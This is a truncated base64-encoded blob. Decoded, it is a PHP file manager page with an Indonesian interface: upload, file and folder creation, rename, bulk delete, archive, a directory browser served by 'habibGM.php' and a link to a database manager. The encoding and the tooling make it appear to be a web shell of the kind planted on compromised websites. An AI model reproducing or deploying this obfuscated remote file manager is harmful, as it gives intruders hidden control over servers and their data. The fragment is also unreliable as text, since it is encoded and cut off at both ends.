vdW5kOiAjMmQyZDJkODg7DQogICAgICAgICAgICBwYWRkaW5nOiA0cHg7DQogICAgICAgICAgICB0ZXh0LXNoYWRvdzogMCAxcHggYmxhY2s7DQogICAgICAgIH0NCiAgICAgICAgLmdlbGFzIHsNCiAgICAgICAgICAgIGJhY2tncm91bmQ6IHJnYmEoMjU1LCAyNTUsIDI1NSwgMC4wOCk7DQogICAgICAgICAgICBiYWNrZHJvcC1maWx0ZXI6IGJsdXIoMTBweCk7DQogICAgICAgICAgICBib3JkZXI6IDFweCBzb2xpZCByZ2JhKDI1NSwgMjU1LCAyNTUsIDAuMTgpOw0KICAgICAgICAgICAgYm94LXNoYWRvdzogMCA4cHggMzJweCAwIHJnYmEoMCwgMCwgMCwgMC4zNyk7DQogICAgICAgICAgICBjb2xvcjogd2hpdGVzbW9rZTsNCiAgICAgICAgICAgIHRyYW5zaXRpb246IHRyYW5zZm9ybSAwLjJzLCBib3gtc2hhZG93IDAuMnM7DQogICAgICAgIH0NCiAgICAgICAgLmZpbGUtaWNvbiB7DQogICAgICAgICAgICBtYXJnaW4tcmlnaHQ6IDhweDsNCiAgICAgICAgICAgIGZvbnQtc2l6ZTogMS4ycmVtOw0KICAgICAgICB9DQovKiBHYXlhIGRhc2FyIHVudHVrIHRhYmVsIGdsYXNzbW9ycGhpc20gKi8NCi50YWJsZS1nbGFzc21vcnAgew0KICAgIC8qIEVmZWsga2FjYTogYmFja2dyb3VuZCB0cmFuc3BhcmFuIGRhbiBmaWx0ZXIgYmx1ciAqLw0KICAgIGJhY2tncm91bmQtY29sb3I6IHJnYmEoMjU1LCAyNTUsIDI1NSwgMC4wOCk7DQogICAgYmFja2Ryb3AtZmlsdGVyOiBibHVyKDEwcHgpOw0KICAgIGJvcmRlcjogMXB4IHNvbGlkIHJnYmEoMjU1LCAyNTUsIDI1NSwgMC4xOCk7DQogICAgcGFkZGluZzogMCBhdXRvOw0KICAgIGJveC1zaGFkb3c6IDAgOHB4IDMycHggMCByZ2JhKDAsIDAsIDAsIDAuMzcpOw0KICAgICAgIHdvcmQtYnJlYWs6IGJyZWFrLWFsbDsgLyogTWVtZWNhaCBrYXRhIHBhbmphbmcgZGkgbWFuYSBzYWphICovDQogICAgICAgIG92ZXJmbG93LXdyYXA6IGJyZWFrLXdvcmQ7IC8qIFN0YW5kYXIgbW9kZXJuIHVudHVrIG1lbWVjYWgga2F0YSAqLw0KICAgICAgICB3aWR0aDogMTAwJTsNCn0NCg0KLyogRWZlayBzYWF0IHRhYmVsIGRpLWhvdmVyICovDQoudGFibGUtZ2xhc3Ntb3JwOmhvdmVyIHsNCiAgICBib3gtc2hhZG93OiAwIDEycHggNDBweCAwIHJnYmEoMCwgMCwgMCwgMC4wNSk7DQogICAgICAgIHdvcmQtYnJlYWs6IGJyZWFrLWFsbDsgLyogTWVtZWNhaCBrYXRhIHBhbmphbmcgZGkgbWFuYSBzYWphICovDQogICAgICAgIG92ZXJmbG93LXdyYXA6IGJyZWFrLXdvcmQ7IC8qIFN0YW5kYXIgbW9kZXJuIHVudHVrIG1lbWVjYWgga2F0YSAqLw0KfQ0KdGQgew0KICAgIGJvcmRlcjogMnB4IHNvbGlkIHJnYmEoMjU1LCAyNTUsIDI1NSwgMC4xOCk7DQogICAgYm94LXNoYWRvdzogMCA4cHggMzJweCAwIHJnYmEoMCwgMCwgMCwgMC4zNyk7DQogICAgY29sb3I6IHdoaXRlc21va2U7DQogICAgdHJhbnNpdGlvbjogdHJhbnNmb3JtIDAuMnMsIGJveC1zaGFkb3cgMC4yczsNCiAgICBwYWRkaW5nOiA4cHg7DQogICAgICAgIHdvcmQtYnJlYWs6IGJyZWFrLWFsbDsgLyogTWVtZWNhaCBrYXRhIHBhbmphbmcgZGkgbWFuYSBzYWphICovDQogICAgICAgIG92ZXJmbG93LXdyYXA6IGJyZWFrLXdvcmQ7IC8qIFN0YW5kYXIgbW9kZXJuIHVudHVrIG1lbWVjYWgga2F0YSAqLw0KICAgIC8qIE1lbmFtYmFoa2FuIHByb3BlcnRpIHVudHVrIHRla3MgYWdhciB0aWRhayBtZW1lY2FoIGJhcmlzICovDQogICAgd2hpdGUtc3BhY2U6IG5vd3JhcDsNCn0NCg0KdHI6aG92ZXIgew0KICAgICAgICAgICAgYm94LXNoYWRvdzogMHB4IDFweCB3aGl0ZXNtb2tlOw0KICAgICAgICAgICAgYmFja2dyb3VuZDogIzJkMmQyZDg4Ow0KICAgICAgICAgICAgcGFkZGluZzogNHB4Ow0KICAgICAgICAgICAgYm94LXNoYWRvdyAwLjJzOw0KICAgICAgICAgICAgdGV4dC1zaGFkb3c6IDBweCAxcHggYmxhY2s7DQp9DQp0aGVhZCB7DQogIHdoaXRlLXNwYWNlOiBub3dyYXA7DQogIHRleHQtYWxpZ246IGNlbnRlcjsNCn0NCnRib2R5IHsNCiAgICAgICAgICB3b3JkLWJyZWFrOiBicmVhay1hbGw7IC8qIE1lbWVjYWgga2F0YSBwYW5qYW5nIGRpIG1hbmEgc2FqYSAqLw0KICAgICAgICBvdmVyZmxvdy13cmFwOiBicmVhay13b3JkOyAvKiBTdGFuZGFyIG1vZGVybiB1bnR1ayBtZW1lY2FoIGthdGEgKi8NCn0NCi5yYXBpaCB7DQogICAgICAgICAgICB3b3JkLWJyZWFrOiBicmVhay1hbGw7IC8qIE1lbWVjYWgga2F0YSBwYW5qYW5nIGRpIG1hbmEgc2FqYSAqLw0KICAgICAgICBvdmVyZmxvdy13cmFwOiBicmVhay13b3JkOyAvKiBTdGFuZGFyIG1vZGVybiB1bnR1ayBtZW1lY2FoIGthdGEgKi8NCn0NCiAgICA8L3N0eWxlPg0KPC9oZWFkPg0KPGJvZHk+DQogICAgPGRpdiBjbGFzcz0iY29udGFpbmVyIG10LTUiPg0KCQk8aDEgY2xhc3M9Im1iLTAiPjxhIGhyZWY9Ii9pbmRleC5waHAiPk1hbmFqZXIgRmlsZTwvYT48L2gxPg0KICAgICAgICA8ZGl2IGNsYXNzPSJkLWZsZXgganVzdGlmeS1jb250ZW50LWJldHdlZW4gYWxpZ24taXRlbXMtY2VudGVyIG1iLTQgb3ZlcmZsb3ctc2Nyb2xsIG10LTQiPg0KCQkJPGEgaHJlZj0iZmxiLnBocCIgY2xhc3M9ImJ0biBidG4tc2Vjb25kYXJ5IGdlbGFzIG1lLTIiPkRhdGFiYXNlIE1hbmFnZXI8L2E+DQoJCQk8YSBocmVmPSI/bG9nb3V0PTEiIGNsYXNzPSJidG4gYnRuLXNlY29uZGFyeSBnZWxhcyBtZS0yIj5Mb2dvdXQ8L2E+DQogICAgICAgICAgICA8L2Rpdj4NCg0KICAgICAgICA8P3BocA0KICAgICAgICBpZiAoaXNzZXQoJF9HRVRbJ2FsZXJ0X21lc3NhZ2UnXSkgJiYgaXNzZXQoJF9HRVRbJ2FsZXJ0X3N0YXR1cyddKSkgew0KICAgICAgICAgICAgJGFsZXJ0X3R5cGUgPSAkX0dFVFsnYWxlcnRfc3RhdHVzJ107DQogICAgICAgICAgICBlY2hvICc8ZGl2IGlkPSJteUFsZXJ0IiBjbGFzcz0iYWxlcnQgYWxlcnQtJyAuICRhbGVydF90eXBlIC4gJyBhbGVydC1kaXNtaXNzaWJsZSBmYWRlIHNob3ciIHJvbGU9ImFsZXJ0Ij4nOw0KICAgICAgICAgICAgZWNobyBodG1sc3BlY2lhbGNoYXJzKCRfR0VUWydhbGVydF9tZXNzYWdlJ10pOw0KICAgICAgICAgICAgZWNobyAnPGJ1dHRvbiB0eXBlPSJidXR0b24iIGNsYXNzPSJidG4tY2xvc2UiIGRhdGEtYnMtZGlzbWlzcz0iYWxlcnQiIGFyaWEtbGFiZWw9IkNsb3NlIj48L2J1dHRvbj4nOw0KICAgICAgICAgICAgZWNobyAnPC9kaXY+JzsNCiAgICAgICAgfQ0KICAgICAgICA/Pg0KICAgICAgICANCiAgICAgICAgPG5hdiBhcmlhLWxhYmVsPSJicmVhZGNydW1iIj4NCiAgICAgICAgICAgIDxvbCBjbGFzcz0iYnJlYWRjcnVtYiI+DQogICAgICAgICAgICAgICAgPGxpIGNsYXNzPSJicmVhZGNydW1iLWl0ZW0iPjxhIGhyZWY9ImhhYmliR00ucGhwIj5Sb290PC9hPjwvbGk+DQogICAgICAgICAgICAgICAgPD9waHANCiAgICAgICAgICAgICAgICAkcGF0aF9wYXJ0cyA9IGV4cGxvZGUoJy8nLCB0cmltKCRkaXIsICcuLycpKTsNCiAgICAgICAgICAgICAgICAkY3VycmVudF9wYXRoID0gJyc7DQogICAgICAgICAgICAgICAgZm9yZWFjaCAoJHBhdGhfcGFydHMgYXMgJHBhcnQpIHsNCiAgICAgICAgICAgICAgICAgICAgaWYgKCRwYXJ0KSB7DQogICAgICAgICAgICAgICAgICAgICAgICAkY3VycmVudF9wYXRoIC49ICRwYXJ0IC4gJy8nOw0KICAgICAgICAgICAgICAgICAgICAgICAgZWNobyAiPGxpIGNsYXNzPSdicmVhZGNydW1iLWl0ZW0nPjxhIGhyZWY9J2hhYmliR00ucGhwP3BhdGg9IiAuIHVybGVuY29kZSgkY3VycmVudF9wYXRoKSAuICInPiIgLiBodG1sc3BlY2lhbGNoYXJzKCRwYXJ0KSAuICI8L2E+PC9saT4iOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgID8+DQogICAgICAgICAgICA8L29sPg0KICAgICAgICA8L25hdj4NCg0KICAgICAgICA8ZGl2IGNsYXNzPSJnZWxhcyBjYXJkIHAtMyBtYi00Ij4NCiAgICAgICAgICAgIDxoNSBjbGFzcz0iY2FyZC10aXRsZSI+VW5nZ2FoIEZpbGUgQmFydTwvaDU+DQogICAgICAgICAgICA8Zm9ybSBhY3Rpb249ImhhYmliR00ucGhwP3BhdGg9PD9waHAgZWNobyB1cmxlbmNvZGUoJGRpcik7ID8+IiBtZXRob2Q9InBvc3QiIGVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiPg0KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImlucHV0LWdyb3VwIj4NCiAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9ImZpbGUiIGNsYXNzPSJmb3JtLWNvbnRyb2wiIG5hbWU9ImZpbGVUb1VwbG9hZCIgaWQ9ImZpbGVUb1VwbG9hZCI+DQogICAgICAgICAgICAgICAgICAgIDxidXR0b24gdHlwZT0ic3VibWl0IiBjbGFzcz0iYnRuIGJ0bi1wcmltYXJ5Ij5VbmdnYWg8L2J1dHRvbj4NCiAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgIDwvZm9ybT4NCiAgICAgICAgPC9kaXY+DQoNCiAgICAgICAgPGRpdiBjbGFzcz0iZC1mbGV4IGp1c3RpZnktY29udGVudC1iZXR3ZWVuIGFsaWduLWl0ZW1zLWNlbnRlciBtYi00IHJhcGloIG92ZXJmbG93LXNjcm9sbCI+DQogICAgICAgICAgICA8YnV0dG9uIHR5cGU9ImJ1dHRvbiIgY2xhc3M9ImJ0biBidG4tcHJpbWFyeSBnZWxhcyBtZS0yIHRleHQtbm93cmFwIiBkYXRhLWJzLXRvZ2dsZT0ibW9kYWwiIGRhdGEtYnMtdGFyZ2V0PSIjY3JlYXRlTW9kYWwiPg0KICAgICAgICAgICAgICAgIDxpIGNsYXNzPSJmYXMgZmEtcGx1cyI+PC9pPiBCdWF0IEZpbGUvRm9sZGVyDQogICAgICAgICAgICA8L2J1dHRvbj4NCiAgICAgICAgICAgICAgIDxidXR0b24gaWQ9ImFyY2hpdmUtYnRuIiBjbGFzcz0iYnRuIGJ0bi1wcmltYXJ5IGdlbGFzIG1lLTIgdGV4dC1ub3dyYXAiIGRpc2FibGVkPg0KICAgICAgICA8aSBjbGFzcz0iZmFzIGZhLWZpbGUtYXJjaGl2ZSI+PC9pPiBBcnNpcGthbg0KICAgIDwvYnV0dG9uPiANCiAgICA8YnV0dG9uIGlkPSJkZWxldGUtc2VsZWN0ZWQtYnRuIiBjbGFzcz0iYnRuIGJ0bi1kYW5nZXIgZ2VsYXMgbWUtMiB0ZXh0LW5vd3JhcCIgZGlzYWJsZWQ+DQogICAgICAgICAgICAgICAgPGkgY2xhc3M9ImZhcyBmYS10cmFzaC1hbHQiPjwvaT4gSGFwdXMNCiAgICAgICAgICAgIDwvYnV0dG9uPg0KICAgICAgICA8L2Rpdj4NCiAgICAgDQogICAgICAgIDxkaXYgY2xhc3M9Im1vZGFsIGZhZGUiIGlkPSJjcmVhdGVNb2RhbCIgdGFiaW5kZXg9Ii0xIiBhcmlhLWxhYmVsbGVkYnk9ImNyZWF0ZU1vZGFsTGFiZWwiIGFyaWEtaGlkZGVuPSJ0cnVlIj4NCiAgICAgICAgICAgIDxkaXYgY2xhc3M9Im1vZGFsLWRpYWxvZyI+DQogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0ibW9kYWwtY29udGVudCBnZWxhcyI+DQogICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9Im1vZGFsLWhlYWRlciBib3JkZXItYm90dG9tLTAiPg0KICAgICAgICAgICAgICAgICAgICAgICAgPGg1IGNsYXNzPSJtb2RhbC10aXRsZSIgaWQ9ImNyZWF0ZU1vZGFsTGFiZWwiPkJ1YXQgRmlsZSBhdGF1IEZvbGRlciBCYXJ1PC9oNT4NCiAgICAgICAgICAgICAgICAgICAgICAgIDxidXR0b24gdHlwZT0iYnV0dG9uIiBjbGFzcz0iYnRuLWNsb3NlIiBkYXRhLWJzLWRpc21pc3M9Im1vZGFsIiBhcmlhLWxhYmVsPSJDbG9zZSI+PC9idXR0b24+DQogICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJtb2RhbC1ib2R5Ij4NCiAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9Im1iLTMiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxmb3JtIGFjdGlvbj0iaGFiaWJHTS5waHA/cGF0aD08P3BocCBlY2hvIHVybGVuY29kZSgkZGlyKTsgPz4iIG1ldGhvZD0icG9zdCI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxsYWJlbCBmb3I9Im5ld19mb2xkZXJfbmFtZSIgY2xhc3M9ImZvcm0tbGFiZWwiPk5hbWEgRm9sZGVyPC9sYWJlbD4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iaW5wdXQtZ3JvdXAiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InRleHQiIGNsYXNzPSJmb3JtLWNvbnRyb2wgZ2VsYXMiIG5hbWU9Im5ld19mb2xkZXJfbmFtZSIgcGxhY2Vob2xkZXI9Ik5hbWEgZm9sZGVyIGJhcnUuLi4iIHJlcXVpcmVkPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGJ1dHRvbiB0eXBlPSJzdWJtaXQiIGNsYXNzPSJidG4gYnRuLXByaW1hcnkiPkJ1YXQgRm9sZGVyPC9idXR0b24+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZm9ybT4NCiAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8Zm9ybSBhY3Rpb249ImhhYmliR00ucGhwP3BhdGg9PD9waHAgZWNobyB1cmxlbmNvZGUoJGRpcik7ID8+IiBtZXRob2Q9InBvc3QiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8bGFiZWwgZm9yPSJuZXdfZmlsZV9uYW1lIiBjbGFzcz0iZm9ybS1sYWJlbCI+TmFtYSBGaWxlPC9sYWJlbD4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iaW5wdXQtZ3JvdXAiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InRleHQiIGNsYXNzPSJmb3JtLWNvbnRyb2wgZ2VsYXMiIG5hbWU9Im5ld19maWxlX25hbWUiIHBsYWNlaG9sZGVyPSJOYW1hIGZpbGUgKG1pcy4gZmlsZS50eHQpLi4uIiByZXF1aXJlZD4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxidXR0b24gdHlwZT0ic3VibWl0IiBjbGFzcz0iYnRuIGJ0bi1wcmltYXJ5Ij5CdWF0IEZpbGU8L2J1dHRvbj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9mb3JtPg0KICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgPC9kaXY+DQogICAgICAgIDwvZGl2Pg0KDQogICAgICAgIDxkaXYgY2xhc3M9InRhYmxlLXJlc3BvbnNpdmUiPg0KICAgICAgICAgICAgPHRhYmxlIGNsYXNzPSJ0YWJsZS1nbGFzc21vcnAiPg0KICAgICAgICAgICAgICAgIDx0aGVhZCBjbGFzcz0iZ2VsYXMiPg0KICAgICAgICAgICAgICAgICAgICA8dHI+DQogICAgICAgICAgICAgICAgICAgICAgICA8dGg+PGlucHV0IHR5cGU9ImNoZWNrYm94IiBpZD0ic2VsZWN0LWFsbC1jaGVja2JveCIgY2xhc3M9ImZvcm0tY2hlY2staW5wdXQiPjwvdGg+DQogICAgICAgICAgICAgICAgICAgICAgICA8dGg+TmFtYTwvdGg+DQogICAgICAgICAgICAgICAgICAgICAgICA8dGg+VGlwZTwvdGg+DQogICAgICAgICAgICAgICAgICAgICAgICA8dGg+VWt1cmFuPC90aD4NCiAgICAgICAgICAgICAgICAgICAgICAgIDx0aD5Ba3NpPC90aD4NCiAgICAgICAgICAgICAgICAgICAgPC90cj4NCiAgICAgICAgICAgICAgICA8L3RoZWFkPg0KICAgICAgICAgICAgICAgIDx0Ym9keSBjbGFzcz0iZ2VsYXMiPg0KICAgICAgICAgICAgICAgICAgICA8P3BocA0KICAgICAgICAgICAgICAgICAgICBpZiAoJGRpciAhPT0gJy4vJykgew0KICAgICAgICAgICAgICAgICAgICAgICAgLy8gQ29ycmVjdGx5IGNhbGN1bGF0ZSB0aGUgcGFyZW50IGRpcmVjdG9yeSBwYXRoDQogICAgICAgICAgICAgICAgICAgICAgICAkcGFyZW50X2RpciA9IHJ0cmltKCRkaXIsICcvJyk7IC8vIFJlbW92ZSB0cmFpbGluZyBzbGFzaA0KICAgICAgICAgICAgICAgICAgICAgICAgJHBhcmVudF9kaXIgPSBkaXJuYW1lKCRwYXJlbnRfZGlyKTsgLy8gR2V0IHRoZSBwYXJlbnQgcGF0aA0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRwYXJlbnRfZGlyID09PSAnLicgfHwgJHBhcmVudF9kaXIgPT09ICcvJykgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFyZW50X2RpciA9ICcuLyc7IC8vIEVuc3VyZSBpdCBnb2VzIGJhY2sgdG8gdGhlIHJvb3QNCiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhcmVudF9kaXIgLj0gJy8nOyAvLyBBZGQgdHJhaWxpbmcgc2xhc2ggZm9yIGNvbnNpc3RlbmN5DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgIGVjaG8gIjx0cj4iOw0KICAgICAgICAgICAgICAgICAgICAgICAgZWNobyAiPHRkPi08L3RkPiI7IC8vIEtvbG9tIGtvc29uZyB1bnR1ayBjZWtib3gNCiAgICAgICAgICAgICAgICAgICAgICAgIGVjaG8gIjx0ZD48YSBocmVmPSdoYWJpYkdNLnBocD9wYXRoPSIgLiB1cmxlbmNvZGUoJHBhcmVudF9kaXIpIC4gIic+PGkgY2xhc3M9J2ZhcyBmYS1mb2xkZXInPjwvaT4gLi48L2E+PC90ZD4iOw0KICAgICAgICAgICAgICAgICAgICAgICAgZWNobyAiPHRkPkZvbGRlcjwvdGQ+IjsNCiAgICAgICAgICAgICAgICAgICAgICAgIGVjaG8gIjx0ZD4tPC90ZD4iOw0KICAgICAgICAgICAgICAgICAgICAgICAgZWNobyAiPHRkPi08L3RkPiI7DQogICAgICAgICAgICAgICAgICAgICAgICBlY2hvICI8L3RyPiI7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgIGZvcmVhY2ggKCRmaWxlcyBhcyAkaXRlbSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRpdGVtICE9PSAnLicgJiYgJGl0ZW0gIT09ICcuLicpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaXRlbV9wYXRoID0gJGRpciAuICRpdGVtOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRmaWxlRXh0ZW5zaW9uID0gc3RydG9sb3dlcihwYXRoaW5mbygkaXRlbSwgUEFUSElORk9fRVhURU5TSU9OKSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGlzQXJjaGl2ZSA9IGluX2FycmF5KCRmaWxlRXh0ZW5zaW9uLCBbJ3ppcCcsICdyYXInLCAndGFyJywgJ2d6JywgJ3RneicsICdpbWcnXSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGlzX2RpcigkaXRlbV9wYXRoKSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlY2hvICI8dHI+IjsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWNobyAiPHRkPjxpbnB1dCB0eXBlPSdjaGVja2JveCcgY2xhc3M9J2Zvcm0tY2hlY2staW5wdXQgaXRlbS1jaGVja2JveCcgdmFsdWU9JyIgLiBodG1sc3BlY2lhbGNoYXJzKCRpdGVtKSAuICInPjwvdGQ+IjsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWNobyAiPHRkPjxhIGhyZWY9J2hhYmliR00ucGhwP3BhdGg9IiAuIHVybGVuY29kZSgkaXRlbV9wYXRoKSAuICIvJz48aSBjbGFzcz0nZmFzIGZhLWZvbGRlcic+PC9pPiAiIC4gaHRtbHNwZWNpYWxjaGFycygkaXRlbSkgLiAiPC9hPjwvdGQ+IjsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWNobyAiPHRkPkZvbGRlcjwvdGQ+IjsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWNobyAiPHRkPi08L3RkPiI7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVjaG8gIjx0ZCBjbGFzcz0ndGV4dC1ub3dyYXAnPiI7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVjaG8gIjxidXR0b24gY2xhc3M9J2J0biBidG4tc20gYnRuLXdhcm5pbmcgbWUtMiByZW5hbWUtYnRuJyBkYXRhLW9sZC1uYW1lPSciIC4gaHRtbHNwZWNpYWxjaGFycygkaXRlbSkgLiAiJz5HYW50aSBOYW1hPC9idXR0b24+IjsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8gSGFwdXMgcGVuZ2VjZWthbiBwZXJhbiBkaSBzaW5pDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVjaG8gIjxhIGhyZWY9J2hhYmliR00ucGhwP2RlbGV0ZT0iIC4gdXJsZW5jb2RlKCRpdGVtKSAuICImcGF0aD0iIC4gdXJsZW5jb2RlKCRkaXIpIC4gIicgY2xhc3M9J2J0biBidG4tc20gYnRuLWRhbmdlcicgb25jbGljaz0ncmV0dXJuIGNvbmZpcm0oXCJBcGFrYWggQW5kYSB5YWtpbiBpbmdpbiBtZW5naGFwdXMgZm9sZGVyIGluaSBkYW4gc2VtdWEgaXNpbnlhP1wiKSc+SGFwdXM8L2E+IjsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWNobyAiPC90ZD4iOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlY2hvICI8L3RyPiI7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGlzSW1hZ2UgPSBpbl9hcnJheSgkZmlsZUV4dGVuc2lvbiwgWydqcGcnLCAnanBlZycsICdwbmcnLCAnZ2lmJywgJ2JtcCcsICdzdmcnXSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpc1ZpZGVvID0gaW5fYXJyYXkoJGZpbGVFeHRlbnNpb24sIFsnbXA0JywgJ2F2aScsICdtb3YnLCAnbWt2JywgJzNncCddKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGlzQXVkaW8gPSBpbl9hcnJheSgkZmlsZUV4dGVuc2lvbiwgWydtcDMnLCAnd2F2JywgJ29nZyddKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVjaG8gIjx0cj4iOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlY2hvICI8dGQ+PGlucHV0IHR5cGU9J2NoZWNrYm94JyBjbGFzcz0nZm9ybS1jaGVjay1pbnB1dCBpdGVtLWNoZWNrYm94JyB2YWx1ZT0nIiAuIGh0bWxzcGVjaWFsY2hhcnMoJGl0ZW0pIC4gIic+PC90ZD4iOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlY2hvICI8dGQ+IjsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRpc0ltYWdlKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlY2hvICI8YSBocmVmPScjJyBkYXRhLWJzLXRvZ2dsZT0nbW9kYWwnIGRhdGEtYnMtdGFyZ2V0PScjaW1hZ2VNb2RhbCcgZGF0YS1pbWFnZS1wYXRoPSciIC4gaHRtbHNwZWNpYWxjaGFycygkaXRlbV9wYXRoKSAuICInPiI7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZWlmICgkaXNWaWRlbykgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWNobyAiPGEgaHJlZj0nIycgZGF0YS1icy10b2dnbGU9J21vZGFsJyBkYXRhLWJzLXRhcmdldD0nI3ZpZGVvTW9kYWwnIGRhdGEtdmlkZW8tcGF0aD0nIiAuIGh0bWxzcGVjaWFsY2hhcnMoJGl0ZW1fcGF0aCkgLiAiJz4iOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2VpZiAoJGlzQXVkaW8pIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVjaG8gIjxhIGhyZWY9JyMnIGRhdGEtYnMtdG9nZ2xlPSdtb2RhbCcgZGF0YS1icy10YXJnZXQ9JyNhdWRpb01vZGFsJyBkYXRhLWF1ZGlvLXBhdGg9JyIgLiBodG1sc3BlY2lhbGNoYXJzKCRpdGVtX3BhdGgpIC4gIic+IjsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVjaG8gIjxpIGNsYXNzPSciIC4gZ2V0RmlsZUljb24oJGl0ZW0pIC4gIiBmaWxlLWljb24nPjwvaT4iIC4gaHRtbHNwZWNpYWxjaGFycygkaXRlbSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkaXNJbWFnZSB8fCAkaXNWaWRlbyB8fCAkaXNBdWRpbykgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWNobyAiPC9hPiI7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlY2hvICI8L3RkPiI7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVjaG8gIjx0ZD5GaWxlPC90ZD4iOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoaXNfZmlsZSgkaXRlbV9wYXRoKSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWNobyAiPHRkPiIgLiByb3VuZChmaWxlc2l6ZSgkaXRlbV9wYXRoKSAvIDEwMjQsIDIpIC4gIiBLQjwvdGQ+IjsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVjaG8gIjx0ZD4tPC90ZD4iOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVjaG8gIjx0ZCBjbGFzcz0ndGV4dC1ub3dyYXAnPiI7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkaXNBcmNoaXZlKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlY2hvICI8YnV0dG9uIGNsYXNzPSdidG4gYnRuLXNtIGJ0bi1pbmZvIG1lLTIgd